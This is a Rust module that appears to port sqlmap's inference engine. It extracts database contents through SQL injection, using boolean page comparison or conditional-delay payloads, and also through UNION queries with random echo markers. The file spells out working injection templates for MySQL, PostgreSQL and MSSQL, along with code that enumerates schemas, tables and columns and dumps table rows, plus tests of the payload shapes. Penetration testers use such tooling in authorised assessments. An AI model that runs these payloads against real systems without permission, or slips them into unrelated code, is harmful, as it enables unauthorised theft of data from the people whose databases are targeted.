//! Blind (inference-based) data exfiltration.
//!
//! Port of sqlmap `lib/request/inference.py` (bisection over boolean `> N`
//! conditions) plus the per-DBMS enumeration query sets from
//! `queries.rs` (MySQL, PostgreSQL, MSSQL, Oracle).
//! `data/xml/queries.xml` used by --dbs / --tables / --columns / --dump.
//! Only the boolean-based blind channel is ported here; UNION exfiltration
//! is separate. Queries are MySQL-flavored (matching the ported query set).

use crate::engine::{assemble, build_request};
use sqlmap_core::config::Config;
use sqlmap_core::injection::Injection;
use sqlmap_core::kb::{ColumnEntry, Enumeration, TableDump};
use sqlmap_http::client::{Client, RequestSpec};
use sqlmap_http::comparison::{filtered_page, ratio};
use sqlmap_http::params::Param;
use sqlmap_http::pool;

/// Cap for inferred string length (sqlmap probes up to a similar bound).
const MAX_LEN: u32 = 64;
/// Cap for inferred schema/table/column/row counts.
const MAX_COUNT: u32 = 50;

/// Extracts data character-by-character through a confirmed boolean-based
/// injection point, using the response comparison ratio as the oracle.
/// How a blind inference condition is confirmed (sqlmap `queryPage` vs its
/// time-based counterpart): page comparison for boolean injections, or a
/// conditional SLEEP for time/stacked/inline injections.
pub enum InferSignal {
    /// Boolean page comparison against the injection's true page.
    Page,
    /// sqlmap's conditional-sleep inference vector. `full_replace` marks the
    /// inline-query shape (the value IS the subquery; technique Q).
    Delay { template: &'static str, full_replace: bool },
}

/// sqlmap's time-based inference vector (time_blind.xml): the SLEEP fires
/// only when [INFERENCE] holds.
const TIME_INFER: &str =
    "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])";
/// Stacked channel (stacked_queries.xml): second statement, conditional sleep.
const STACKED_INFER: &str = ";SELECT SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))-- ";
/// Inline channel (inline_query.xml): the whole value becomes the subquery.
const INLINE_INFER: &str =
    "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])";

/// PostgreSQL vectors: no IF(), so the conditional sleep is a CASE; the
/// pg_sleep() void result makes `IS NULL` pass so the predicate still holds.
const PG_TIME_INFER: &str =
    "AND [RANDNUM]=(SELECT [RANDNUM] WHERE (CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END) IS NULL)";
const PG_STACKED_INFER: &str =
    ";SELECT CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END-- ";
const PG_INLINE_INFER: &str =
    "(SELECT [RANDNUM] FROM (SELECT (CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END))[RANDSTR])";

/// MSSQL vectors: WAITFOR DELAY is a statement, so the conditional delay
/// rides the same `IF(...) WAITFOR` statement shape as the detection
/// payloads in stacked_queries.xml / inline_query.xml.
const MS_TIME_INFER: &str =
    "AND [RANDNUM]=(SELECT [RANDNUM] WHERE 1=1 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]')";
const MS_STACKED_INFER: &str = ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'-- ";
const MS_INLINE_INFER: &str =
    "(SELECT [RANDNUM] WHERE 1=1 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]')";

/// Pick the inference channel for an injection by its technique and DBMS
/// (sqlmap retrieves data through whichever technique confirmed the
/// injection). Unknown/absent DBMS tags fall back to the MySQL vectors.
pub fn infer_signal(technique: sqlmap_core::config::Technique, dbms: Option<&str>) -> InferSignal {
    use sqlmap_core::config::Technique as T;
    let dbms = dbms
        .and_then(crate::queries::Dbms::parse)
        .unwrap_or(crate::queries::Dbms::MySql);
    let (time, stacked, inline) = match dbms {
        crate::queries::Dbms::PostgreSql => (PG_TIME_INFER, PG_STACKED_INFER, PG_INLINE_INFER),
        crate::queries::Dbms::MsSql => (MS_TIME_INFER, MS_STACKED_INFER, MS_INLINE_INFER),
        _ => (TIME_INFER, STACKED_INFER, INLINE_INFER),
    };
    match technique {
        T::Time => InferSignal::Delay { template: time, full_replace: false },
        T::Stacked => InferSignal::Delay { template: stacked, full_replace: false },
        T::Inline => InferSignal::Delay { template: inline, full_replace: true },
        _ => InferSignal::Page,
    }
}

pub struct BlindExtractor<'a> {
    client: &'a Client,
    conf: &'a Config,
    param: Param,
    inj: Injection,
    /// The injection's true page (filtered); conditions compare against it.
    true_page: String,
    /// Lazily fetched known-false page (AND 1=2 probe): the second model
    /// the anomaly guard needs to tell "genuinely false" from "transient
    /// junk" (port of the resembles-neither-model check upstream's jitter
    /// harness exercises).
    false_page: Option<String>,
    threshold: f64,
    seed: u64,
    qs: crate::queries::Dbms,
    signal: InferSignal,
    pub log: Vec<String>,
}

/// SQL hex string literal, avoiding quotes inside the injected fragment
/// (sqlmap does the same to keep string boundaries intact).
/// Choose the enumeration query set: the injection's DBMS hint (fingerprint
/// or --dbms) wins; unknown tags fall back to MySQL with a log note, the
/// historical behavior of this crate.
fn pick_query_set(conf: &sqlmap_core::config::Config, inj: &sqlmap_core::injection::Injection) -> crate::queries::Dbms {
    let tag = inj.dbms.as_deref().or(conf.dbms.as_deref()).unwrap_or("mysql");
    crate::queries::Dbms::parse(tag).unwrap_or(crate::queries::Dbms::MySql)
}

fn hex(s: &str) -> String {
    let mut out = String::from("0x");
    for b in s.bytes() {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

/// Fetch a MODEL page (true baseline / false model) under jitter: single
/// fetches can land on a transient junk page, and a polluted model corrupts
/// every later comparison. Re-fetch until two consecutive responses agree
/// (ratio >= threshold), max 3 tries; the first page is the fallback.
pub fn stable_page(
    client: &Client,
    conf: &Config,
    param: &Param,
    val: &str,
    threshold: f64,
) -> Option<String> {
    let mut prev: Option<String> = None;
    let mut first: Option<String> = None;
    for _ in 0..3 {
        let resp = client
            .request(&build_request(conf, param, &val.to_string()))
            .ok()?;
        let page = filtered_page(&resp.body);
        if let Some(p) = &prev {
            if ratio(p, &page) >= threshold {
                return Some(page);
            }
        }
        if first.is_none() {
            first = Some(page.clone());
        }
        prev = Some(page);
    }
    first
}

/// Re-requests for one probe when the response matches neither page model
/// (transient junk). Keeps a single blip from flipping a bisection bit.
const JITTER_RETRIES: u32 = 2;

impl<'a> BlindExtractor<'a> {
    pub fn new(
        client: &'a Client,
        conf: &'a Config,
        param: Param,
        inj: Injection,
        true_page: String,
        threshold: f64,
        signal: InferSignal,
    ) -> Self {
        let qs = pick_query_set(conf, &inj);
        Self {
            signal,
            client,
            conf,
            param,
            inj,
            true_page,
            false_page: None,
            threshold,
            seed: 0,
            qs,
            log: Vec::new(),
        }
    }

    /// Fire one inference condition. Page mode: true when the page still
    /// matches the injection's true page (port of `queryPage`). Delay mode:
    /// true when the response is delayed by ~time_sec (sqlmap's time-based
    /// inference: SLEEP(x-(IF(cond,0,x))) sleeps only when cond holds).
    fn check(&mut self, cond: &str) -> Option<bool> {
        self.seed += 1;
        let (val, need) = match &self.signal {
            InferSignal::Page => (
                assemble(
                    self.conf,
                    &mut self.log,
                    &self.param,
                    &self.inj.boundary,
                    &format!("AND {cond}"),
                    20000 + self.seed,
                ),
                None,
            ),
            InferSignal::Delay { template, full_replace } => {
                let q = template.replace("[INFERENCE]", cond);
                let v = if *full_replace {
                    crate::engine::assemble_full(self.conf, &mut self.log, &q, 20000 + self.seed)
                } else {
                    assemble(self.conf, &mut self.log, &self.param, &self.inj.boundary, &q, 20000 + self.seed)
                };
                (v, Some(std::time::Duration::from_secs(self.conf.time_sec as u64)))
            }
        };
        // Anomaly guard (page mode): a response matching neither the true
        // nor the false model is transient junk (gateway 5xx, WAF
        // interstitial, maintenance page). Upstream rides these out with
        // retrial + per-char re-validation; we re-request the same probe up
        // to JITTER_RETRIES times and only then give up on the value - a
        // flipped bit is worse than a skipped one.
        let mut attempt = 0;
        loop {
            let resp = self
                .client
                .request(&build_request(self.conf, &self.param, &val))
                .ok()?;
            return Some(match need {
                Some(need) => resp.elapsed >= need,
                None => {
                    let page = filtered_page(&resp.body);
                    if ratio(&self.true_page, &page) >= self.threshold {
                        true
                    } else {
                        let false_page = self.false_model()?;
                        if ratio(&false_page, &page) >= self.threshold {
                            false
                        } else if attempt < JITTER_RETRIES {
                            attempt += 1;
                            continue;
                        } else {
                            self.log.push(
                                "  inference aborted on persistent anomalous responses (matches neither true nor false model)"
                                    .into(),
                            );
                            return None;
                        }
                    }
                }
            });
        }
    }

    /// The known-false page model, fetched once on first use.
    fn false_model(&mut self) -> Option<String> {
        if let Some(p) = &self.false_page {
            return Some(p.clone());
        }
        let val = match &self.signal {
            InferSignal::Page => assemble(
                self.conf,
                &mut self.log,
                &self.param,
                &self.inj.boundary,
                "AND 1=2",
                30000,
            ),
            _ => return None,
        };
        let page = stable_page(self.client, self.conf, &self.param, &val, self.threshold)?;
        self.false_page = Some(page.clone());
        Some(page)
    }

    /// Bisect a non-negative integer expression with `expr > mid` probes
    /// (port of sqlmap's bisect loop in inference mode).
    /// Returns None when the value exceeds `hi` or a request fails.
    fn infer_num(&mut self, cond: impl Fn(u32) -> String, hi: u32) -> Option<u32> {
        if !self.check(&cond(0))? {
            return Some(0);
        }
        if self.check(&cond(hi))? {
            self.log
                .push("  inference hit its upper bound - value beyond cap, skipped".into());
            return None;
        }
        let (mut lo, mut hi) = (0u32, hi);
        while lo < hi {
            let mid = (lo + hi + 1) / 2;
            if self.check(&cond(mid))? {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        Some(lo + 1)
    }

    /// Recover the string value of a scalar subquery (LENGTH bisect, then
    /// per-position ASCII bisect with an equality confirmation, as sqlmap does).
    fn infer_string(&mut self, scalar: &str) -> Option<String> {
        let len = self.infer_num(|n| format!("LENGTH(({scalar}))>{n}"), MAX_LEN)?;
        if len == 0 {
            return Some(String::new());
        }
        let mut out = String::new();
        for pos in 1..=len {
            let v = self.infer_num(
                |n| format!("ASCII(SUBSTRING(({scalar}),{pos},1))>{n}"),
                126,
            );
            let v = match v {
                Some(v) if (1..=126).contains(&v) => v,
                _ => {
                    out.push('?');
                    continue;
                }
            };
            // Final equality check rules out a mid-flight false positive.
            let confirmed = self
                .check(&format!("ASCII(SUBSTRING(({scalar}),{pos},1))={v}"))
                .unwrap_or(false);
            if confirmed {
                out.push(char::from_u32(v).unwrap_or('?'));
            } else {
                out.push('?');
            }
        }
        Some(out)
    }

    fn infer_count(&mut self, count_q: &str) -> Option<u32> {
        self.infer_num(|n| format!("({count_q})>{n}"), MAX_COUNT)
    }

    fn list_schemata(&mut self) -> Option<Vec<String>> {
        let n = self.infer_count(&self.qs.schemata_count())?;
        let mut out = Vec::new();
        for i in 0..n {
            out.push(self.infer_string(&self.qs.at(&self.qs.schemata_select(), i))?);
        }
        Some(out)
    }

    fn list_tables(&mut self, db: &str) -> Option<Vec<String>> {
        let n = self.infer_count(&self.qs.tables_count(db))?;
        let mut out = Vec::new();
        for i in 0..n {
            out.push(self.infer_string(&self.qs.at(&self.qs.tables_select(db), i))?);
        }
        Some(out)
    }

    fn list_columns(&mut self, db: &str, table: &str) -> Option<Vec<String>> {
        // SQLite has no column catalog: recover the CREATE statement and
        // parse it (upstream's sqlite plugin does the same client-side).
        if let Some(ddl_q) = self.qs.sqlite_ddl_select(table) {
            let ddl = self.infer_string(&ddl_q)?;
            return Some(crate::queries::parse_columns_from_ddl(&ddl));
        }
        let n = self.infer_count(&self.qs.columns_count(db, table))?;
        let mut out = Vec::new();
        for i in 0..n {
            out.push(self.infer_string(&self.qs.at(&self.qs.columns_select(db, table), i))?);
        }
        Some(out)
    }

    fn dump_table(&mut self, db: &str, table: &str, columns: &[String]) -> Option<TableDump> {
        let n = self.infer_count(&self.qs.rows_count(db, table))?;
        let mut rows = Vec::new();
        for i in 0..n {
            let row = self.infer_string(&self.qs.at(&self.qs.row_select(db, table, columns), i))?;
            rows.push(row.split(':').map(|c| c.to_string()).collect::<Vec<_>>());
        }
        Some(TableDump {
            db: db.to_string(),
            table: table.to_string(),
            columns: columns.to_vec(),
            rows,
        })
    }

    /// Run the enumeration requested by the config flags.
    pub fn run(&mut self) -> Enumeration {
        let mut en = Enumeration::default();

        let mut dbs: Vec<String> = Vec::new();
        let need_dbs = self.conf.enum_dbs || (self.conf.enum_tables && self.conf.target_db.is_none());
        if need_dbs {
            self.log.push("enumerating database names".into());
            match self.list_schemata() {
                Some(found) => {
                    self.log.push(format!("  databases: {}", found.join(", ")));
                    dbs = found;
                    if self.conf.enum_dbs {
                        en.databases = dbs.clone();
                    }
                }
                None => self.log.push("  database enumeration failed (transport/cap)".into()),
            }
        }

        if self.conf.enum_tables {
            let targets: Vec<String> = match &self.conf.target_db {
                Some(d) => vec![d.clone()],
                None => dbs.clone(),
            };
            for db in targets {
                self.log.push(format!("enumerating tables in '{db}'"));
                match self.list_tables(&db) {
                    Some(tables) => {
                        self.log.push(format!("  {db}: {}", tables.join(", ")));
                        en.tables.insert(db.clone(), tables);
                    }
                    None => self.log.push(format!("  table enumeration failed for '{db}'")),
                }
            }
        }

        if self.conf.enum_columns || self.conf.dump {
            match (self.conf.target_db.clone(), self.conf.target_table.clone()) {
                (Some(db), Some(table)) => {
                    self.log.push(format!("enumerating columns in '{db}.{table}'"));
                    match self.list_columns(&db, &table) {
                        Some(cols) => {
                            self.log.push(format!("  {db}.{table}: {}", cols.join(", ")));
                            if self.conf.enum_columns {
                                en.columns.push(ColumnEntry {
                                    db: db.clone(),
                                    table: table.clone(),
                                    columns: cols.clone(),
                                });
                            }
                            if self.conf.dump {
                                self.log.push(format!("dumping '{db}.{table}'"));
                                match self.dump_table(&db, &table, &cols) {
                                    Some(dump) => {
                                        self.log.push(format!(
                                            "  dumped {} row(s) from {db}.{table}",
                                            dump.rows.len()
                                        ));
                                        en.dumps.push(dump);
                                    }
                                    None => self.log.push(format!("  dump failed for '{db}.{table}'")),
                                }
                            }
                        }
                        None => self.log.push(format!("  column enumeration failed for '{db}.{table}'")),
                    }
                }
                _ => self
                    .log
                    .push("--columns/--dump require -D <db> and -T <table> - skipped".into()),
            }
        }

        en
    }
}

/// Extracts data through a confirmed UNION injection: one request per value
/// (port of sqlmap `useUnionEngine`: the query result rides back inside the
/// page, delimited by random markers).
pub struct UnionExtractor<'a> {
    client: &'a Client,
    conf: &'a Config,
    param: Param,
    inj: Injection,
    columns: u32,
    seed: u64,
    qs: crate::queries::Dbms,
    pub log: Vec<String>,
}

/// Random hex-delimited marker pair (sqlmap delimits the UNION echo the same
/// way so the value can be located in the page).
struct Markers {
    open_sql: String,
    close_sql: String,
    open_txt: String,
    close_txt: String,
}

fn markers(seed: u64) -> Markers {
    let mut x = seed.max(1) ^ 0x9e3779b9;
    let mut gen = || {
        let mut s = String::new();
        for _ in 0..5 {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            s.push((b'a' + (x % 26) as u8) as char);
        }
        s
    };
    let (a, b) = (gen(), gen());
    Markers {
        open_sql: hex(&a),
        close_sql: hex(&b),
        open_txt: a,
        close_txt: b,
    }
}

impl<'a> UnionExtractor<'a> {
    pub fn new(client: &'a Client, conf: &'a Config, param: Param, inj: Injection) -> Option<Self> {
        let columns = inj.column_count?;
        Some(Self {
            client,
            conf,
            qs: pick_query_set(conf, &inj),
            param,
            inj,
            columns,
            seed: 0,
            log: Vec::new(),
        })
    }

    /// Build one marked UNION request: fresh delimiting markers, the
    /// SELECT-list row produced by `make_items`, assembled through the
    /// injection boundary. Pure request construction - nothing is sent here,
    /// so callers can batch independent requests for the worker pool.
    fn build_marked(
        &mut self,
        marker_base: u64,
        make_items: impl FnOnce(&Markers) -> String,
    ) -> (Markers, RequestSpec) {
        self.seed += 1;
        let m = markers(marker_base + self.seed);
        let payload = format!(" UNION ALL SELECT {}", make_items(&m));
        let val = assemble(
            self.conf,
            &mut self.log,
            &self.param,
            &self.inj.boundary,
            &payload,
            30000 + self.seed,
        );
        (m, build_request(self.conf, &self.param, &val))
    }

    /// Fire built requests concurrently through the worker pool; response
    /// bodies come back in request order (None on transport error).
    fn fire(&self, specs: Vec<RequestSpec>) -> Vec<Option<String>> {
        pool::run_requests(self.client, specs, self.conf.threads.max(1))
            .into_iter()
            .map(|r| r.ok().map(|resp| resp.body))
            .collect()
    }

    fn null_row_items(&self) -> Vec<String> {
        vec!["NULL".to_string(); self.columns as usize]
    }

    /// Find which UNION column is reflected in the page (sqlmap `unionTest`'s
    /// second half: probe each position with a delimited constant). The
    /// per-position probes are independent, so they run through the pool.
    fn find_echo_position(&mut self) -> Option<usize> {
        let mut marks = Vec::new();
        let mut specs = Vec::new();
        for pos in 0..self.columns as usize {
            let mut items = self.null_row_items();
            let (m, spec) = self.build_marked(40000, |m| {
                items[pos] = format!("CONCAT({},0x70726f6265,{})", m.open_sql, m.close_sql);
                items.join(",")
            });
            marks.push(m);
            specs.push(spec);
        }
        let bodies = self.fire(specs);
        for (pos, body) in bodies.iter().enumerate() {
            let Some(body) = body else { continue };
            let m = &marks[pos];
            if body.contains(&format!("{}probe{}", m.open_txt, m.close_txt)) {
                return Some(pos);
            }
        }
        None
    }

    /// Evaluate scalar subqueries, one per request, and extract each value
    /// from its page echo. Independent subqueries run concurrently through
    /// the pool; values come back in query order.
    fn query_scalars(&mut self, echo_pos: usize, scalars: &[String]) -> Vec<Option<String>> {
        let mut marks = Vec::with_capacity(scalars.len());
        let mut specs = Vec::with_capacity(scalars.len());
        for scalar in scalars {
            let mut items = self.null_row_items();
            let (m, spec) = self.build_marked(50000, |m| {
                items[echo_pos] = format!("CONCAT({},({scalar}),{})", m.open_sql, m.close_sql);
                items.join(",")
            });
            marks.push(m);
            specs.push(spec);
        }
        self.fire(specs)
            .iter()
            .zip(&marks)
            .map(|(body, m)| {
                let body = body.as_ref()?;
                let start = body.find(&m.open_txt)? + m.open_txt.len();
                let end = body[start..].find(&m.close_txt)? + start;
                Some(body[start..end].to_string())
            })
            .collect()
    }

    /// Evaluate one scalar subquery and extract its value from the page echo.
    fn query_scalar(&mut self, echo_pos: usize, scalar: &str) -> Option<String> {
        self.query_scalars(echo_pos, &[scalar.to_string()])
            .into_iter()
            .next()
            .flatten()
    }

    /// Run the enumeration requested by the config flags, UNION channel.
    pub fn run(&mut self) -> Enumeration {
        let mut en = Enumeration::default();
        let Some(echo) = self.find_echo_position() else {
            self.log
                .push("UNION exfil: no SELECT-list column is reflected in the page - giving up".into());
            return en;
        };
        self.log.push(format!(
            "UNION exfil: column {} of {} is reflected - using it",
            echo + 1,
            self.columns
        ));

        let mut dbs: Vec<String> = Vec::new();
        let need_dbs = self.conf.enum_dbs || (self.conf.enum_tables && self.conf.target_db.is_none());
        if need_dbs {
            self.log.push("enumerating database names (UNION)".into());
            if let Some(v) = self.query_scalar(
                echo,
                &self.qs.schemata_agg(),
            ) {
                dbs = v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
                self.log.push(format!("  databases: {}", dbs.join(", ")));
                if self.conf.enum_dbs {
                    en.databases = dbs.clone();
                }
            }
        }

        if self.conf.enum_tables {
            let targets: Vec<String> = match &self.conf.target_db {
                Some(d) => vec![d.clone()],
                None => dbs.clone(),
            };
            let scalars: Vec<String> = targets
                .iter()
                .map(|db| {
                    self.qs.tables_agg(db)
                })
                .collect();
            for (db, v) in targets.iter().zip(self.query_scalars(echo, &scalars)) {
                if let Some(v) = v {
                    let tables: Vec<String> =
                        v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
                    self.log.push(format!("  {db}: {}", tables.join(", ")));
                    en.tables.insert(db.clone(), tables);
                }
            }
        }

        if self.conf.enum_columns || self.conf.dump {
            match (self.conf.target_db.clone(), self.conf.target_table.clone()) {
                (Some(db), Some(table)) => {
                    let cols = match self.qs.sqlite_ddl_select(&table) {
                        // SQLite: one round trip for the CREATE statement,
                        // then a client-side parse (as upstream).
                        Some(ddl_q) => self
                            .query_scalar(echo, &ddl_q)
                            .map(|ddl| crate::queries::parse_columns_from_ddl(&ddl))
                            .unwrap_or_default(),
                        None => self
                            .query_scalar(echo, &self.qs.columns_agg(&db, &table))
                            .map(|v| v.split(':').filter(|s| !s.is_empty()).map(String::from).collect::<Vec<_>>())
                            .unwrap_or_default(),
                    };
                    self.log.push(format!("  {db}.{table}: {}", cols.join(", ")));
                    if self.conf.enum_columns {
                        en.columns.push(ColumnEntry {
                            db: db.clone(),
                            table: table.clone(),
                            columns: cols.clone(),
                        });
                    }
                    if self.conf.dump {
                        let n = self
                            .query_scalar(echo, &self.qs.rows_count(&db, &table))
                            .and_then(|v| v.trim().parse::<u32>().ok())
                            .unwrap_or(0);
                        // Every row fetch is independent: batch them through the pool.
                        let scalars: Vec<String> = (0..n)
                            .map(|i| self.qs.at(&self.qs.row_select(&db, &table, &cols), i))
                            .collect();
                        let rows: Vec<Vec<String>> = self
                            .query_scalars(echo, &scalars)
                            .into_iter()
                            .flatten()
                            .map(|v| v.split(':').map(String::from).collect::<Vec<_>>())
                            .collect();
                        self.log.push(format!("  dumped {} row(s) from {db}.{table}", rows.len()));
                        en.dumps.push(TableDump {
                            db,
                            table,
                            columns: cols,
                            rows,
                        });
                    }
                }
                _ => self
                    .log
                    .push("--columns/--dump require -D <db> and -T <table> - skipped".into()),
            }
        }

        en
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hex_encodes_ascii() {
        assert_eq!(hex("shop"), "0x73686f70");
        assert_eq!(hex(""), "0x");
    }

    fn delay_template(technique: sqlmap_core::config::Technique, dbms: Option<&str>) -> String {
        match infer_signal(technique, dbms) {
            InferSignal::Delay { template, .. } => template.to_string(),
            InferSignal::Page => panic!("expected a Delay signal"),
        }
    }

    #[test]
    fn infer_vectors_follow_technique_and_dbms() {
        use sqlmap_core::config::Technique as T;

        // MySQL (and the unknown/absent fallback) keeps the SLEEP/IF shape.
        for dbms in [Some("mysql"), None, Some("oracle")] {
            assert!(delay_template(T::Time, dbms).contains("SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))"));
            assert!(delay_template(T::Stacked, dbms).starts_with(";SELECT SLEEP("));
            assert!(delay_template(T::Inline, dbms).contains("SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))"));
        }

        // PostgreSQL: CASE-driven pg_sleep, no IF().
        let pg_time = delay_template(T::Time, Some("postgresql"));
        assert!(pg_time.contains("CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END"));
        assert!(!pg_time.contains("IF("));
        assert!(delay_template(T::Stacked, Some("postgresql")).starts_with(";SELECT CASE WHEN"));
        assert!(delay_template(T::Inline, Some("pgsql")).contains("PG_SLEEP([SLEEPTIME])"));

        // MSSQL: IF(...) WAITFOR DELAY statement shape, no SLEEP/CASE.
        let ms_time = delay_template(T::Time, Some("mssql"));
        assert!(ms_time.contains("IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'"));
        assert!(!ms_time.contains("SLEEP("));
        assert!(delay_template(T::Stacked, Some("mssql")).starts_with(";IF([INFERENCE]) WAITFOR"));
        assert!(delay_template(T::Inline, Some("Microsoft SQL Server")).contains("WAITFOR DELAY"));

        // Non-delay techniques keep the page-comparison signal.
        assert!(matches!(infer_signal(T::Boolean, Some("mssql")), InferSignal::Page));
        assert!(matches!(infer_signal(T::Union, None), InferSignal::Page));
    }
}
